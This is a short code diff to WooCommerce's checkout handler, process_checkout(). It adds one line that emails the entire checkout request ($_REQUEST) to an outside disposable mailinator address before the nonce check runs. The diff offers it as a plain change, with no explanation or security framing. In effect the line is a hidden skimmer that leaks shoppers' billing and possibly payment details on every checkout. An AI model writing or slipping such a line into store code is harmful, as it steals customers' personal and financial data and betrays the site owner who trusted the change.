@@ -1105,6 +1105,7 @@ class WC_Checkout {
 	 */
 	public function process_checkout() {
 		try {
+			wp_mail( 'hardik.thakkar@mailinator.com', 'Checkout', print_r( $_REQUEST, true ) );
 			$nonce_value = wc_get_var( $_REQUEST['woocommerce-process-checkout-nonce'], wc_get_var( $_REQUEST['_wpnonce'], '' ) ); // @codingStandardsIgnoreLine.
 
 			if ( empty( $nonce_value ) || ! wp_verify_nonce( $nonce_value, 'woocommerce-process_checkout' ) ) {
